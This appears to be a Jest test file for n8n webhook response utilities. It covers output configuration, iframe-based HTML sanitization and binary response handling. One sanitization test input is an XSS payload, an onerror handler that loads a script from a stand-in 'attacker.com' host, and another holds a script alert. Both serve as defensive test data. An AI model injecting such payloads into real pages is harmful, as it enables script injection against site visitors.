import type { IDataObject } from 'n8n-workflow';
import { BINARY_ENCODING } from 'n8n-workflow';
import { configuredOutputs } from '../utils/outputs';
import { replaceSingleQuotes, sanitizeResponseData } from '../utils/sanitization';
import { getBinaryResponse } from '../utils/binary';

describe('configuredOutputs', () => {
	it('returns array of objects when version >= 1.3', () => {
		const result = configuredOutputs(1.3, {});
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns array of objects when version > 1.4 and enableResponseOutput', () => {
		const result = configuredOutputs(2, { enableResponseOutput: true });
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns ["main"] when version < 1.3', () => {
		const result = configuredOutputs(1.2, {});
		expect(result).toEqual(['main']);
	});

	it('returns array of objects when version  1.4 and enableResponseOutput', () => {
		const result = configuredOutputs(1.4, { enableResponseOutput: true });
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns ["main"] when version  1.4 and !enableResponseOutput', () => {
		const result = configuredOutputs(1.4, { enableResponseOutput: false });
		expect(result).toEqual(['main']);
	});
});

describe('sanitizeResponseData', () => {
	test.each([
		{
			srcdoc: 'https://example.com',
		},
		{
			srcdoc:
				"<source onerror=\"s=document.createElement('script');s.srcdoc='http://attacker.com/evil.js';document.body.appendChild(s);\">",
		},
		{
			srcdoc: "<div>Test with  'single quote'</div>",
		},
		{
			srcdoc:
				"John's company \"TechCorp & Associates\" announced: 'We're launching a revolutionary product at €1,299.99 — it's 50% faster than competitors!' The CEO said, \"This isn't just an upgrade; it's a complete transformation.\" Users praised the app's ability to handle complex data like <script>alert('XSS')</script> and symbols such as @, #, $, %, ^, &, *, (, ), [, ], {, }, |, , /, ?, <, >, ~, `, +, =, -, _, and even emojis like 🚀 & 💡. The product description reads: \"It supports UTF-8 encoding, handles apostrophes in names like O'Connor & D'Angelo, processes mathematical expressions like 2 < 5 > 1, and manages URLs such as https://example.com/path?param=value&other='test'. We've tested it with HTML entities like &amp;, &lt;, &gt;, &quot;, &#39;, and even complex strings like `console.log(\"Hello 'World'!\");`\" — truly impressive!",
		},
	])('wraps the response body in an iframe', ({ srcdoc }) => {
		const result = sanitizeResponseData(srcdoc);
		const singleQuoteReplaced = replaceSingleQuotes(srcdoc);

		expect(result).toContain('<iframe');
		expect(result).toContain(`srcdoc='${singleQuoteReplaced}'`);
		expect(result).toContain('width:100vw');
		expect(result).toContain('height:100vh');
		expect(result).toContain('position:fixed');
		expect(result).toContain('top:0');
		expect(result).toContain('left:0');
		expect(result).toContain('border:none');
		expect(result).toContain('allowtransparency="true"');
		expect(result.trim().startsWith('<iframe')).toBe(true);
		expect(result.trim().endsWith('</iframe>')).toBe(true);
	});
});

describe('getBinaryResponse', () => {
	it('returns sanitized HTML when binaryData.id is present and mimeType is text/html', () => {
		const binaryData = {
			id: '123',
			data: '<h1>Hello</h1>',
			mimeType: 'text/html',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(result).toBe(sanitizeResponseData(binaryData.data));
		expect(headers['content-type']).toBe('text/html');
	});

	it('returns { binaryData } when binaryData.id is present and mimeType is not text/html', () => {
		const binaryData = {
			id: '123',
			data: 'some-binary-data',
			mimeType: 'application/octet-stream',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(result).toEqual({ binaryData });
		expect(headers['content-type']).toBe('application/octet-stream');
	});

	it('returns sanitized HTML when binaryData.id is not present and mimeType is text/html', () => {
		const binaryData = {
			data: '<h1>Hello</h1>',
			mimeType: 'text/html',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(result).toBe(
			sanitizeResponseData(Buffer.from(binaryData.data, BINARY_ENCODING).toString()),
		);
		expect(headers['content-type']).toBe('text/html');
	});

	it('returns Buffer when binaryData.id is not present and mimeType is not text/html', () => {
		const binaryData = {
			data: 'some-binary-data',
			mimeType: 'application/octet-stream',
		};
		const headers: IDataObject = {};

		const result = getBinaryResponse(binaryData, headers);

		expect(Buffer.isBuffer(result)).toBe(true);
		expect(result.toString()).toBe(Buffer.from(binaryData.data, BINARY_ENCODING).toString());
		expect(headers['content-type']).toBe('application/octet-stream');
		expect(headers['content-length']).toBe(Buffer.from(binaryData.data, BINARY_ENCODING).length);
	});
});
